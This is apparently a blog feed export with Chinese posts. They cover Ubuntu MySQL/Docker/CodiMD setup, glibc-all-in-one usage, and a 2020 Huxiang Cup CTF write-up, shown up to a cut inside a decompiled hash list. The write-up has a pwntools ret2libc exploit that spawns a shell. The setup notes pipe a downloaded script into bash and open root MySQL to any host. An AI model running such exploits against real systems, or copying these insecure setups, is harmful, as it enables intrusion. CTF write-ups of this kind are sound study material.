<h2 id="修改主机名-1"><a href="#修改主机名-1" class="headerlink" title="修改主机名"></a>修改主机名</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<h2 id="修改-etc-hosts配置文件（可选）"><a href="#修改-etc-hosts配置文件（可选）" class="headerlink" title="修改/etc/hosts配置文件（可选）"></a>修改/etc/hosts配置文件（可选）</h2><p>/etc/hosts存放的是域名与ip的对应关系，域名与主机名没有任何关系，你可以为任何一个IP指定任意一个名字。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p>增加一行新的127.0.0.1 name就行</p>
<h2 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>









<h1 id="VM-tools安装"><a href="#VM-tools安装" class="headerlink" title="VM tools安装"></a>VM tools安装</h1><h2 id="解压-tar-gz-文件"><a href="#解压-tar-gz-文件" class="headerlink" title="解压 .tar.gz 文件"></a>解压 .tar.gz 文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxvf filename</span><br><span class="line"><span class="built_in">cd</span> file name</span><br><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure>



<h1 id="Ubuntu服务器环境搭建"><a href="#Ubuntu服务器环境搭建" class="headerlink" title="Ubuntu服务器环境搭建"></a>Ubuntu服务器环境搭建</h1><h2 id="搭建-mysql、docker、codimd"><a href="#搭建-mysql、docker、codimd" class="headerlink" title="搭建 mysql、docker、codimd"></a>搭建 mysql、docker、codimd</h2><h2 id="修改-sudo-密码"><a href="#修改-sudo-密码" class="headerlink" title="修改 sudo 密码"></a>修改 sudo 密码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>



<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install mysql-server -y</span><br></pre></td></tr></table></figure>

<h3 id="查看mysql版本"><a href="#查看mysql版本" class="headerlink" title="查看mysql版本"></a>查看mysql版本</h3><p>最简单的方法就是打开mysql直接看</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mysql</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102113524196.png" alt="image-20211102113524196"></p>
<h3 id="首次登录mysql未设置密码或忘记密码解决方法"><a href="#首次登录mysql未设置密码或忘记密码解决方法" class="headerlink" title="首次登录mysql未设置密码或忘记密码解决方法"></a>首次登录mysql未设置密码或忘记密码解决方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/mysql/debian.cnf</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102113724567.png" alt="image-20211102113724567"></p>
<h3 id="进入mysql"><a href="#进入mysql" class="headerlink" title="进入mysql"></a>进入mysql</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -u debian-sys-maint -p</span><br><span class="line">// 这条指令之后，输入上面获得的password，进入mysql</span><br></pre></td></tr></table></figure>

<h3 id="8-0"><a href="#8-0" class="headerlink" title="8.0"></a>8.0</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set authentication_string&#x3D;&#39;&#39; where user&#x3D;&#39;root&#39;;</span><br><span class="line">alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;newpassword&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<h3 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update mysql.user set authentication_string&#x3D;password(&#39;****&#39;) where user&#x3D;&#39;****&#39;;</span><br></pre></td></tr></table></figure>

<h3 id="5-7-1"><a href="#5-7-1" class="headerlink" title="5.7"></a>5.7</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update mysql.user set password&#x3D;&#39;newpassword&#39; where user&#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure>



<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose -y</span><br></pre></td></tr></table></figure>



<h2 id="CodiMD"><a href="#CodiMD" class="headerlink" title="CodiMD"></a>CodiMD</h2><p>服务器防火墙需要打开3306和3000端口</p>
<h3 id="创建mysql数据库"><a href="#创建mysql数据库" class="headerlink" title="创建mysql数据库"></a>创建mysql数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database codimd;</span><br><span class="line"></span><br><span class="line">use mysql;</span><br><span class="line">update user set host &#x3D; &#39;%&#39; where user &#x3D;&#39;root&#39;;</span><br><span class="line">select host, user from user;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<h3 id="配置yml"><a href="#配置yml" class="headerlink" title="配置yml"></a>配置yml</h3><p>创建文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkdir codiMD</span><br><span class="line"><span class="built_in">cd</span> codiMD</span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>配置内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  codimd:</span><br><span class="line">    image: nabo.codimd.dev&#x2F;hackmdio&#x2F;hackmd:2.0.1</span><br><span class="line">    environment:</span><br><span class="line">      - CMD_DB_URL&#x3D;mysql:&#x2F;&#x2F;root:passwd@39.97.235.0:3306&#x2F;codimd</span><br><span class="line">        # CMD_DB_URL 格式为 </span><br><span class="line">        # 数据库连接协议:&#x2F;&#x2F;用户名:密码@数据库主机:数据库端口&#x2F;数据库名</span><br><span class="line">        # 如果同样使用 mysql，只需修改密码与服务器 ip 即可</span><br><span class="line">      - CMD_USECDN&#x3D;false</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;3000:3000&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - upload-data:&#x2F;home&#x2F;hackmd&#x2F;app&#x2F;public&#x2F;uploads</span><br><span class="line">    restart: always</span><br><span class="line">volumes:</span><br><span class="line">  upload-data: &#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安装CodiMD"><a href="#安装CodiMD" class="headerlink" title="安装CodiMD"></a>安装CodiMD</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="查看docker日志"><a href="#查看docker日志" class="headerlink" title="查看docker日志"></a>查看docker日志</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 10  codimd_codimd_1</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102120815479.png" alt="image-20211102120815479"></p>
<h3 id="查看-netstat"><a href="#查看-netstat" class="headerlink" title="查看 netstat"></a>查看 netstat</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -an|grep 3306</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102120925631.png" alt="image-20211102120925631"></p>
<p>现在的3306端口绑定的IP地址是本地的127.0.0.1</p>
<h3 id="修改Mysql配置文件"><a href="#修改Mysql配置文件" class="headerlink" title="修改Mysql配置文件"></a>修改Mysql配置文件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102121406488.png" alt="image-20211102121406488"></p>
<p>在前面加上 # ，注释掉两项</p>
<h3 id="重启mysql"><a href="#重启mysql" class="headerlink" title="重启mysql"></a>重启mysql</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">Restarting mysql (via systemctl): mysql.service.</span><br></pre></td></tr></table></figure>

<h3 id="再次查看-netstat"><a href="#再次查看-netstat" class="headerlink" title="再次查看 netstat"></a>再次查看 netstat</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -an|grep 3306</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20211102121731809.png" alt="image-20211102121731809"></p>
<h3 id="再次查看docker日志"><a href="#再次查看docker日志" class="headerlink" title="再次查看docker日志"></a>再次查看docker日志</h3><p><img src="/article/Ubuntu20_zsh/image-20211102121816810.png" alt="image-20211102121816810"></p>
<p>成功</p>
<p><img src="/article/Ubuntu20_zsh/image-20211102121832838.png" alt="image-20211102121832838"></p>
<p>没想到一个小小共享文档能弄出那么多事情来</p>
<p>/(ㄒoㄒ)/~~</p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>exp</title>
    <url>/article/exp/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d8b7a5ce3552961e6b713e9654a98a6fc051c186024b210f99ef5c65bbb2e53b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>glibc-all-in-one</title>
    <url>/article/glibc-all-in-one/</url>
    <content><![CDATA[<h1 id="记glibc-all-in-one使用"><a href="#记glibc-all-in-one使用" class="headerlink" title="记glibc-all-in-one使用"></a>记glibc-all-in-one使用</h1><span id="more"></span>

<p><a href="https://mp.weixin.qq.com/s/UAQswvnasJ0a40ibSy4ppg">参考</a></p>
<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><h2 id="glibc-all-in-one下载"><a href="#glibc-all-in-one下载" class="headerlink" title="glibc-all-in-one下载"></a>glibc-all-in-one下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br></pre></td></tr></table></figure>

<h2 id="glibc-all-in-one安装"><a href="#glibc-all-in-one安装" class="headerlink" title="glibc-all-in-one安装"></a>glibc-all-in-one安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo python3 update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><img src="/article/glibc-all-in-one/image-20211012172502704.png" alt="image-20211012172502704"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download 2.31-0ubuntu9_amd64</span><br></pre></td></tr></table></figure>

<h3 id="old-list"><a href="#old-list" class="headerlink" title="old_list"></a>old_list</h3><p>和上面差不多</p>
<p><img src="/article/glibc-all-in-one/image-20211012172551035.png" alt="image-20211012172551035"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download_old 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>

<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><h2 id="patchelf下载"><a href="#patchelf下载" class="headerlink" title="patchelf下载"></a>patchelf下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br></pre></td></tr></table></figure>

<h2 id="patchelf安装"><a href="#patchelf安装" class="headerlink" title="patchelf安装"></a>patchelf安装</h2><p>这里我的ubuntu16没有报错，挺顺利</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh //如果报错 ./bootstrap.sh: 2: autoreconf: not found                 </span><br><span class="line">				//执行这个   sudo apt-get install autoconf automake libtool</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one$ sudo ./download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>

<p>打开隐藏文件</p>
<p><code>Ctrl + h</code></p>
<p>可以先在这个目录下 <code>pwd</code>一下</p>
<p><img src="/article/glibc-all-in-one/image-20211012180509161.png" alt="image-20211012180509161"></p>
<p><img src="/article/glibc-all-in-one/image-20211012180244757.png" alt="image-20211012180244757"></p>
<p>解压下载的<code>deb</code>包到<code>.debug</code>中</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one/debs$ sudo dpkg -X [libc6_2.27-3ubuntu1_amd64.deb] /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/.debug</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>

<p>然后利用patchelf工具修改elf程序所需的动态链接库</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>2020湖湘杯hxb</title>
    <url>/article/hxb_2020/</url>
    <content><![CDATA[<h1 id="2020湖湘杯hxb"><a href="#2020湖湘杯hxb" class="headerlink" title="2020湖湘杯hxb"></a>2020湖湘杯hxb</h1><span id="more"></span>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跟进if下面的函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>


<p>写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>

<p>这就print出来了puts的地址</p>
<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
<p>在套用一下公式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>

<p>复习一下libc64_getshell公式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p><img src="https://img-blog.csdnimg.cn/2020111417004942.png#pic_center" alt="在这里插入图片描述"></p>
<p>长度32</p>
<p><img src="https://img-blog.csdnimg.cn/20201114170457298.png#pic_center" alt="在这里插入图片描述"></p>
<p>关键字符串</p>
<p><img src="https://img-blog.csdnimg.cn/20201114170212320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>v11是一个个字符<br>下面异或<br>写脚本<br>over<br>python_exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span></span><br><span class="line">v13 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v11 = <span class="built_in">ord</span>(<span class="built_in">str</span>[i:i+<span class="number">1</span>])</span><br><span class="line">    v13 += <span class="built_in">chr</span>(i ^ v11)</span><br><span class="line">    v11 ^= i</span><br><span class="line"><span class="built_in">print</span>(v13)</span><br></pre></td></tr></table></figure>


<p>java_exp: </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String a = <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> v11;</span><br><span class="line">        <span class="keyword">int</span> v13;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v11 = a.charAt(i);</span><br><span class="line">            v13 = i ^ (<span class="keyword">int</span>)v11;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>)v13);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag:<br>7e02a9c4439056df0e2a7b432b0069b3</p>
<h2 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h2><p>python反编译项目<br> 先下载：<br>链接: <a href="https://github.com/countercept/python-exe-unpacker">https://github.com/countercept/python-exe-unpacker</a></p>
<p>之后把要反编译的exe放到目录下<br>再执行下面的命令<br><code>python3 pyinstxtractor.py ReMe.exe</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201114174957755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功之后如上图，并且在目录下会生成一个新的文件夹<br>进入被创建出来的文件夹，用winhex打开一个你软件名字的文件和一个名为struct的文件</p>
<p><img src="https://img-blog.csdnimg.cn/20201114175111142.png#pic_center" alt="在这里插入图片描述"><br>我们需要把目标文件也就是ReMe的头添加上struct中的16进制头数据</p>
<p><img src="https://img-blog.csdnimg.cn/20201114175807232.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020111417582892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>选中，右键-&gt;Edit-&gt;Copy Block-&gt;Hex Values<br>总之就是复制为16进制的数据<br><img src="https://img-blog.csdnimg.cn/2020111418030031.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>到ReMe中Crtl+v粘贴上<br>一下就是最终的效果<br><img src="https://img-blog.csdnimg.cn/20201114180437151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>保存之后添加pyc后缀名<br><img src="https://img-blog.csdnimg.cn/20201114180716119.png#pic_center" alt="在这里插入图片描述"><br>然后在终端安装uncompyle<br><code>pip install uncompyle</code></p>
<p>安装好之后在ReMe.pyc文件目录下执行：</p>
<p><code>uncompyle6 ReMe.pyc</code><br><img src="https://img-blog.csdnimg.cn/20201114181521899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>出现了源代码</p>
<p>可以用</p>
<p><code>uncompyle6 ReMe.pyc &gt; ReMe.py</code></p>
<p>生成py文件</p>
<p><img src="https://img-blog.csdnimg.cn/2020111418165395.png#pic_center" alt="在这里插入图片描述"></p>
<p>源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span 